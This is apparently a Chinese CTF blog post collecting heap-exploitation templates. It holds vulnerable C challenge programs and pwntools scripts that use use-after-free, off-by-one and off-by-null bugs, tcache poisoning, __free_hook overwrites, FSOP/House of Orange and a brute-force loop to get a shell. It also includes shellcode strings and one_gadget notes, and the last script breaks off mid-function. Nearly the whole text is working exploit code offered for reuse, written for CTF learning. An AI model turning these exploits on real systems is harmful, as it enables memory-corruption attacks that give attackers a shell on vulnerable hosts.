---
title: 堆利用总结
date: 2022-05-09 22:54:59 +0800
categories: [漏洞利用总结]
tags: [pwn, ctf]
permalink: /posts/id=19/
pin: false
published:
---

这里记录一些ctf中堆pwn的板子，总结学习，堆的关键核心始终是构造指针重叠。

## libc2.27/打掉tcache拿libc(UAF)

题目

```c
//uaf
#include<stdio.h>
#include<stdlib.h>
char *heap[0x20];
int num=0;
void create()
{
    if(num>=0x20)
    {
        puts("no more");
        return;
    }
    int size;
    puts("how big");
    scanf("%d",&size);
    if(size>=0x20)
    {
        puts("no more");
        return;
    }
    heap[num]=(char *)malloc(size);
    num++;
}
void show(){
    int i;
  int idx;
  char buf[4];
  puts("idx");
    (read(0, buf, 4));
    idx = atoi(buf);
  if (!heap[idx]) {
    puts("no hvae things\n");
  } else {
    printf("Content:");
    printf("%s",heap[idx]);
  }
}
void dele()
{
    int i;
  int idx;
  char buf[4];
  puts("idx");
    (read(0, buf, 4));
    idx = atoi(buf);
  if (!heap[idx]) {
    puts("no hvae things\n");
  } else {
      free(heap[idx]);
      num--;
  }
}
void edit()
{
    int size;
    int i;
  int idx;
  char buf[4];
  puts("idx");
    (read(0, buf, 4));
    idx = atoi(buf);
  if (!heap[idx]) {
    puts("no hvae things\n");
  } else {
      puts("how big u read");
      scanf("%d",&size);
      if(size>0x20)
      {
          puts("too more");
          return;
      }
      puts("Content:");
      read(0,heap[idx],size);
  }
}
void menu(void){
    puts("1.create");
    puts("2.dele");
    puts("3.edit");
    puts("4.show");
}
void main()
{
    int choice;
    while(1)
    {
        menu();
        scanf("%d",&choice);
        switch(choice)
        {
            case 1:create();break;
            case 2:dele();break;
            case 3:edit();break;
            case 4:show();break;
            default:puts("error");
        }
    }
}
```
```python
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.arch='amd64'

p = process('./pwn1')
p = remote("ctf.joe1sn.top","28099")
elf = ELF("./pwn1")
libc = elf.libc
#elf=ELF('./pwn')

def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add(size):
    sla(">>",'1')
    sla("size:\n",size)

def dele(idx):
    sla(">>",2)
    sla("idx:",idx)

def edit(idx,size,con):
    sla(">>",3)
    sla("idx:",idx)
    sla("size:",size)
    p.sendafter("content:",con)

def show(idx):
    sla(">>",4)
    sla("idx:",idx)

def dbg():
    gdb.attach(p)
    pause()

for i in range(7):
    add(0x10)

#拿堆地址
dele(0)
dele(1)
show(1)
p.recvuntil("content:")
heap=u64(p.recv(6)+'\x00'*2)-0x1680+0x10
lg('heap')

# 申请到tcache管理空间，同时恢复tcache结构体功能，保持0x20堆块正常运行
edit(0,0x10,p64(heap))
add(0x10)
add(0x10)
add(0x10)
add(0x10)
add(0x10)
edit(7,0x20,p64(0)*4) # 7即tcache结构体
# 利用uaf申请到tcache结构题内管理0x250堆块的部分
dele(5)# 5-1
edit(5,0x10,p64(heap+0x20))
add(0x10)
add(0x10)
edit(10,0x20,p64(0x0000000007000000))
dele(7)
# 打到unsortbin后切割获取libc
add(0x10)
show(10)
p.recvuntil("content:")
libc_base=u64(p.recv(6)+'\x00'*2)-0x3ebee0
lg('libc_base')
free_hook=libc_base+libc.sym['__free_hook']
system=libc_base+libc.sym['system']

# 恢复一下结构体，进行最后的uaf利用
edit(10,0x20,p64(0)*4)
dele(10)
edit(10,0x20,p64(free_hook))
add(0x10)
add(0x10)
edit(11,0x10,p64(system))
edit(10,0x10,"/bin/sh\x00")
dele(10)
p.interactive()
```
## libc2.31/伪造大堆free泄露地址(UAF)

高版本可以打tcache_struct，但一定是可以申请到0x50堆的时候。

题目情况：固定0x20大小malloc，最多10个堆，UAF，几乎没有存在性检测，edit固定8字节，offbynull。

不能打掉tcache的原因是，打掉tcache后tcachebin[0x20]填满，但相应ptr头节点为0，libc2.31检测到头节点为0会crash

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p = process('./classroom')
elf = ELF("./classroom")
libc = ELF("./libc-2.31.so")
# p = remote("123.57.69.203",7030)
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(idx,con):
	sla(">",'1')
	sla(">",idx)
	p.sendlineafter(">",con)

def show(idx):
	sla(">",'1')
	sla(">",idx)

def edit(idx,con):
	sla(">",'3')
	sla(">",idx)
	p.sendlineafter(">",con)

def dele(idx):
	sla(">",'2')
	sla(">",idx)

# 发现存在一个大堆
add(0,'a')
add(1,'a')
dele(0)
dele(1)

show(1)
p.recvuntil("Welcome my student :")
heap_base = u64(p.recv(6)+'\x00'*2)-0x11eb0
lg('heap_base',heap_base)
fakechunk =heap_base+0x11eb0-0x6b0# 位于大堆最后部分的位置
lg('fakechunk',fakechunk)#
heap_ptr_base = heap_base+0x90

edit(1,p64(fakechunk+8))
add(2,'a')
add(3,p64(0x6a1))# fakechunk相应大小

dele(0)
dele(1)

edit(1,p64(fakechunk+0x10))
add(4,'a')
add(5,'a')
dele(5)

show(5)
p.recvuntil("Welcome my student :")
libc_base = uu64()-96-0x1ECB80
lg('libc_base',libc_base)
free_hook = libc_base+0x1EEE48
system = libc_base+0x52290
lg('system',system)

dele(0)
dele(1)
edit(1,p64(free_hook))
add(6,'/bin/sh\x00')
add(7,p64(system))
dele(6)

p.interactive()
'''
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''
```

## 堆溢出堆叠/万用合并(offby8)

题目
```c
#include<stdio.h>
#include <math.h>
#include <stdio.h>
#include<unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
void sandbox(){
    struct sock_filter filter[] = {
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),
    BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),
    BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}
int init()
{
    setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
int num=0;
char *heaparray[0x10];
size_t realsize[0x10];
void create(){
    if(num>=0x20)
    {
        puts("no more");
        return;
    }
    int size;
    puts("Size of Heap : ");
    scanf("%d",&size);
    heaparray[num]=(char *)malloc(size);
    realsize[num]=size;
    num++;

    }
void show(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入堆块的index
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){//根据序列进行查找
        //打印指定堆块内容
        printf("Size : %ld\nContent : %s\n",realsize[idx],heaparray[idx]);
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}
void edit(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入堆的序列号
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){//判断序列号的正确性
        puts("Out of bound!");
        _exit(0);
    }
  //若序列号正确
    if(heaparray[idx]){
        int size;
    puts("Size of Heap : ");
    scanf("%d",&size);
        printf("Content of heap : \n");
        read(0,heaparray[idx],size);
    //调用read_input函数输入堆的内容
        puts("Done !");
    }else{
        puts("No such heap !");
    }
}
void dele(){
    int idx ;
    char buf[4];
    printf("Index :\n");
    read(0,buf,4);//输入index
    idx = atoi(buf);
    if(idx < 0 || idx >= 0x10){//判断堆块序列的合法性
        puts("Out of bound!");
        _exit(0);
    }
    if(heaparray[idx]){
        free(heaparray[idx]);//free heaparray[idx]指针
        realsize[idx] = 0 ;
        heaparray[idx]=NULL;
        puts("Done !"); 
        num--;
    }else{
        puts("No such heap !");
    }
}
void menu(void){
    puts("1.create");
    puts("2.dele");
    puts("3.edit");
    puts("4.show");
}
void main()
{
    init();
    sandbox();
    int choice;
    while(1)
    {
        menu();
        scanf("%d",&choice);
        switch(choice)
        {
            case 1:create();break;
            case 2:dele();break;
            case 3:edit();break;
            case 4:show();break;
            default:puts("error");
        }
    }
}
```

```python
from pwn import *
r=process('./zheap')
elf = ELF('zheap')
libc=elf.libc
context.log_level='debug'
def add(size):
    r.sendlineafter("4.show\n",'1')
    r.sendlineafter("Size of Heap : \n",str(size))

def dele(idx):
    r.sendlineafter("4.show\n",'2')
    r.sendlineafter("Index :\n",str(idx))

def edit(idx,con):
    r.sendlineafter("4.show\n",'3')
    r.sendlineafter("Index :\n",str(idx))
    r.sendafter("Content of heap : \n",con)
def show(idx):
    r.sendlineafter("4.show\n",'4')
    r.sendlineafter("Index :\n",str(idx))
def dbg():
    gdb.attach(r)
    pause()
# 9个0x80堆=0x480，填0x21自主合并
add(0x18)#0
add(0x78)#1
for i in range(10):
    add(0x78)
for i in range(2,10):
    edit(i,p64(0x21)*14)
edit(0,'a'*0x18+p64(0x421))
dele(1)
# 泄露完libc去找堆复用
add(0x18)
show(1)
r.recvuntil("Content : ")
leak=u64(r.recv(6)+'\x00'*2)
print(hex(leak))
base=leak-0x3ec090
sys=libc.sym['system']+base
free=libc.sym['__free_hook']+base
# 用vmmap看heap结构体存在堆复用
dele(1)
edit(11,p64(free))
add(0x18)
add(0x18)
edit(11,"/bin/sh")
edit(12,p64(sys))
dele(11)
r.interactive()
```
## 向下合并(offbyone/malloc_consolidate拿libc)
题目漏洞就是edit的offbyone，数据输入用的scanf输入

```python
from pwn import *
context.log_level = 'debug'
context.arch='amd64'
'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
  '''
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("bitflip")
elf = ELF('bitflip')
libc = elf.libc

def cmd(choice):
	sla('Your choice: ',choice)
def add(idx,size):
	cmd(1)
	sla('Index: ',idx)
	sla('Size: ',size)

def edit(idx,content):
	cmd(2)
	sla('Index: ',idx)
	p.sendlineafter(': ',content)

def show(idx):
	cmd(3)
	sla('Index: ',idx)

def delete(idx):
	cmd(4)
	sla('Index: ',idx)
def dbg():
	gdb.attach(p)
	pause()

for i in range(9):
	add(i,0x48)
for i in range(8):
	delete(i)

p.sendlineafter('Your choice: ','99999999'*0xf0)
for i in range(7):
	add(i,0x48)

add(7,0x48)
show(7)
p.recvuntil('Content: ')
libc_base = u64(p.recv(6)+'\x00'*2)-160-0x3EBC40
lg('libc_base',libc_base)
sys=libc.sym['system']+libc_base
free=libc.sym['__free_hook']+libc_base
for i in range(9,16):
	add(i,0x18)
for i in range(16,23):
	add(i,0x28)

add(23,0x18)
add(24,0x28)
add(25,0x18)
add(26,0x18)

for i in range(9,23):
	delete(i)
delete(25)
edit(23,'a'*0x18+'\x51')
delete(24)
add(27,0x48)
edit(27,p64(0x21)*6+p64(free-0x10))
for i in range(9,16):
	add(i,0x18)
add(24,0x18)
edit(24,'/bin/sh\x00')
add(25,0x18)
edit(25,p64(sys))
delete(24)

p.interactive()
```
## 向下合并制造假死(offbyone/有附属chunk)

漏洞点主要有offbyone，UAF，malloc任意size

主要利用offbyone达到一个类似堆溢出的效果，让一个有效chunk进入unsortbin，有效绕过存在性检测

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p = process('./careless_note')
elf = ELF("./careless_note")
libc = elf.libc
p = remote("123.57.69.203",8010)
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(size,con):
	sla("Your choice :",1)
	sla("Size of Heap : ",size)
	p.sendafter("Content of heap:",con)

def edit(idx,con):
	sla("Your choice :",2)
	sla("Index :",idx)
	sla("Your choose:",1)
	p.sendafter("Content of heap : ",con)

def show(idx):
	sla("Your choice :",3)
	sla("Index :",idx)
def dele(idx):
	sla("Your choice :",2)
	sla("Index :",idx)
	sla("Your choose:",0)

heaparry = 0x6020C0
# 利用free后未置空残留泄露地址
add(0x400,'a')
add(0x68,'a')
dele(0)
add(0x30,'\x68')
show(0)
libc_base = uu64()-0x3f0-88-0x3C4B20
lg('libc_base',libc_base)
edit(0,'a'*0xf+'b')
show(0)
p.recvuntil('b')
heap_base = u64(p.recv(4).ljust(8,'\x00'))-0x20
lg('heap_base',heap_base)

malloc_hook = libc_base+libc.sym['__malloc_hook']
free_hook = libc_base+libc.sym['__free_hook']
one = libc_base+0x4527a
lg('one',one)

# 构造向下合并
add(0x390,'a')
add(0x68,'a')#3
add(0x28,'a')#4
add(0x28,'a')#5
add(0x28,'a')#6
add(0x68,'a')#7
dele(6)
edit(3,'a'*0x68+'\xf1')
dele(4)

add(0x60,'a')
edit(4,'a'*0x50+p64(0x100)+p64(free_hook))
edit(5,p64(one))
dele(7)
p.interactive()
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
```

## libc2.27及以下/大堆向前合并(offbynull)

题目就是offbynull漏洞，一般可申请的堆都在0x100作业
```python
from pwn import *
context.log_level = 'debug'
context.arch='amd64'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("old_school_revenge")
elf = ELF('old_school_revenge')
libc = elf.libc

def cmd(choice):
	sla('Your choice: ',choice)
def add(idx,size):
	cmd(1)
	sla('Index: ',idx)
	sla('Size: ',size)

def edit(idx,content):
	cmd(2)
	sla('Index: ',idx)
	p.sendlineafter(': ',content)

def show(idx):
	cmd(3)
	sla('Index: ',idx)

def delete(idx):
	cmd(4)
	sla('Index: ',idx)
def dbg():
	gdb.attach(p)
	pause()

for i in range(9):
	add(i,0x48)
for i in range(8):
	delete(i)

p.sendlineafter('Your choice: ','99999999'*0xf0)
for i in range(7):
	add(i,0x48)

add(7,0x48)
show(7)
p.recvuntil('Content: ')
libc_base = u64(p.recv(6)+'\x00'*2)-160-0x3EBC40
lg('libc_base',libc_base)
free=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
# 前面是看到scanf输入直接抄板子梭哈了，获取到libc
for i in range(10,17):
	add(i,0xf8)
add(17,0xf8)
add(18,0x88)# edit中间这个chunk
add(19,0xf8)
add(20,0x88)
for i in range(10,17):
	delete(i)

delete(17)
edit(18,'a'*0x80+p64(0x190))
delete(19)
for i in range(10,17):
	add(i,0xf8)
add(21,0xf8)
add(22,0x88)
delete(18)
edit(22,p64(free))
add(23,0x88)
edit(23,'/bin/sh\x00')
add(24,0x88)
edit(24,p64(sys))
delete(23)
p.interactive()
```
## libc2.31/2.29/大堆合并（offbynull）
题目限制堆数量10个，for循环编号赋予
基本上无size限制，仅有offbynull漏洞，libc-2.31

伪造出一个chunk，使其能够绕过这两个检测。
一个是向低地值合并的检测：

```c
if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
```
另一个就是unlink时候的检测
```c
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
    malloc_printerr (check_action, "corrupted double-linked list", P, AV);
```
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-3385e98bb1814af0.png)

```python
from pwn import *
context.log_level = 'debug'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("bornote")
elf = ELF('bornote')
libc = elf.libc

def cmd(choice):
	sla("aaa's cmd: ",choice)

def add(size):
	cmd(1)
	sla('Size: ',size)

def edit(idx,content):
	cmd(3)
	sla('Index: ',idx)
	p.sendlineafter('Note: ',content)

def show(idx):
	cmd(4)
	sla('Index: ',idx)

def delete(idx):
	cmd(2)
	sla('Index: ',idx)

def dbg():
	gdb.attach(p)
	pause()
fakechunk = 0x00005561306c6f00
sla('username: ','aaa')
# 这里size最大最好别超过0x440，不然放进largebin时/不在同一个区间上
add(0x418) # 0 
add(0x128) # 1 # 最后绕过tcache个数检测，和最后利用堆复用的chunk一样大
add(0x418) # 2
add(0x438) # 3 
add(0x148) # 4
add(0x428) # 5 
add(0x138) # 6

# fakechunk 粘fd和bk
delete(0)
delete(3)
delete(5)

#设置fakechunk size位
delete(2) 
add(0x438)  # 0 
edit(0,'a' * 0x418 + p64(0xb01)[:7])
add(0x418)  # 2 
add(0x428)  # 3 
add(0x418)  # 5 

# 设置bk
delete(5)
delete(2)
add(0x418)  # 2 
edit(2,p64(0))
add(0x418)  # 5 

# 设置fd
delete(5)
delete(3)
add(0x5f8)# 3 # 置入largebin
add(0x428)# 5
edit(5,'')
add(0x418)# 7
add(0xf8)# 8

# 设置prevsize
edit(6,'a'*0x130+p64(0xb00))
delete(3)

add(0x10)# 3
show(7)
p.recvuntil("Note: ")
libc_base = u64(p.recv(6).ljust(8,'\x00'))- 0x1EBBE0
lg('libc_base',libc_base)
sys = libc_base + libc.sym["system"]
free_hook = libc_base + libc.sym["__free_hook"]
add(0x128)#9
delete(1)
delete(9)
edit(7,p64(free_hook))
add(0x128)# 1
add(0x128)# 9
edit(1,"/bin/sh\x00")
edit(9,p64(sys))
delete(1)

p.interactive()
```
## 爆破模板
漏洞是UAF，但每次申请的size大小不可控，导致无法准确申请到想要的堆
尽量避免doublefree的申请，降低爆破次数
```python
#coding=utf-8
from pwn import *
# context.log_level = 'debug'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)
# p = process("random_heap")
elf = ELF('random_heap')
libc = elf.libc
def cmd(choice):
	sla("Your choice: ",choice)
def add(idx,size):
	cmd(1)
	sla("Index: ",idx)
	sla("Size: ",size)
def edit(idx,content):
	cmd(2)
	sla("Index: ",idx)
	p.sendafter("Content: ",content)
def show(idx):
	cmd(3)
	sla("Index: ",idx)
def delete(idx):
	cmd(4)
	sla("Index: ",idx)
def dbg():
    gdb.attach(p)
    pause()

def pwn():
	add(0,0xf8)
	add(1,0x88)
	edit(1,'/bin/sh\x00')
	# 拿堆地址
	delete(0)
	edit(0,'a'*0x10)
	delete(0)
	show(0)
	p.recvuntil("Content: ")
	heap=u64(p.recv(6)+'\x00'*2)-0x260
	lg('heap',heap)
	for i in range(6):
		edit(0,'a'*0x10)
		delete(0)
	show(0)
	p.recvuntil("Content: ")
	libc_base=u64(p.recv(6)+'\x00'*2)-96-0x3ebc40
	lg('libc_base',libc_base)
	free_hook = libc_base + libc.sym['__free_hook']
	system = libc_base + libc.sym['system']
	add(2,0x18)
	delete(2)
	edit(0,p64(free_hook)*2)
	delete(2)
	edit(0,p64(free_hook)*2)
	add(2,0x18)
	show(2)
	tmp = u64(((p.recvuntil("\x7f",timeout=0.4))[-6::]).ljust(8,'\x00'))
	if(tmp!=free_hook):
		exit()
	add(3,0x18)
	edit(3,p64(system))
	delete(1)
	p.sendline("cat flag")
	print p.recvuntil("}",timeout=0.4)

times = 0
while 1:
	try:
		p = process("./random_heap")
		pwn()
		p.interactive()
	except:
		times += 1
		print("="*8+str(times)+" times"+"="*8)
		p.close()
```

## UAF修改fd(malloc_consolidate+UAF)

漏洞点：UAF offbyone scanf输入

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p = process('./untidy_note')
elf = ELF("./untidy_note")
libc = elf.libc
p = remote("123.57.69.203",7030)
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(size):
	sla("Your choose is:\n",1)
	sla("the note size is:\n",size)

def edit(idx,size,con):
	sla("Your choose is:\n",3)
	sla("index:\n",idx)
	sla("the size is:\n",size)
	p.sendafter("Content:\n",con)

def show(idx):
	sla("Your choose is:\n",4)
	sla("index:\n",idx)

def dele(idx):
	sla("Your choose is:\n",2)
	sla("index:\n\n",idx)

heap = 0x202040
sla("Welcome to use untidy_note,Your name is:",'E4L4')
for i in range(9):
	add(0x18)
for i in range(8):
	dele(i)
sla("Your choose is:\n",'99999999'*0xf0)
show(7)
p.recvuntil("Content:")
libc_base = uu64()-112-0x3EBC40
lg('libc_base',libc_base)

sys = libc.sym['system']+libc_base
free = libc.sym['__free_hook']+libc_base
one = libc_base+0x4f432

edit(6,0x21,p64(free))

add(0x18)
add(0x18)

edit(2,0x21,p64(one))
dele(1)

p.interactive()
'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
```

## libc2.23/House of Orange(UAF+最大堆块0x60+offbynull)

说是HOO其实算用到FSOP更合适，2021年四川省省赛的一道题，难点在于程序开始开辟了一个干扰线程，将管理堆块里记录的ptr全部清除

![image-20220507103139088](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507103139088.png)

![image-20220507103215107](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507103215107.png)

首先利用一个doublefree泄露堆地址同时实现任意堆地址写，然后构造向下合并，泄露libc(这里这道题libc是动态地址随机加载的，做的时候没想到怎么获得，这里直接用的本地去随机化后的固定值，算是一个bug)，然后切割unsortbin，残留0x60堆块，再利用任意堆地址写实现Io_file伪造布局。过程中用到干扰进程的清除功能，实现更多的堆申请。

**由于题目没有edit，这里主要利用doublefree实现edit功能。且题目对于堆申请有限制，申请不到0x70的堆无法进行常规利用**

![image-20220507104532095](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507104532095.png)

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p = process('./Delay3')
elf = ELF("./Delay3")
libc = elf.libc
# libc = ELF("./libc-2.23.so")
# p = remote("123.57.69.203",7030)
def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(size,con):
	sla("choice :",'1')
	sla("size:",size)
